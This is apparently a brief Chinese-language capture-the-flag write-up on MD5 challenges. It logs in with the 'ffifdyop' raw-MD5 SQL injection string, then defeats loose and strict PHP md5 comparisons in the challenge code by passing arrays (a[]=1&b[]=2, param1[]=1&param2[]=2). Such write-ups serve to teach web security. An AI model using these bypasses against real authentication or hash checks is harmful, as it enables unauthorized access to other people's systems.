#MD5

![Pasted image 20230301205307.png](../../.image/Pasted%20image%2020230301205307.png)
使用 ffifdyop 万能密码
之后查看源码，发现提示

```php
<!--
$a = $GET['a'];
$b = $_GET['b'];
if($a != $b && md5($a) == md5($b)){
    header('Location: levell14.php');
-->
```

数组绕过

```url
a[]=1&b[]=2
```

```php
<?php
error_reporting(0);
include "flag.php";
highlight_file(__FILE__);
if ($_POST['param1'] !== $_POST['param2'] && md5($_POST['param1']) === md5($_POST['param2'])) {
    echo $flag;
}
```

数组绕过

```url
param1[]=1&param2[]=2
```
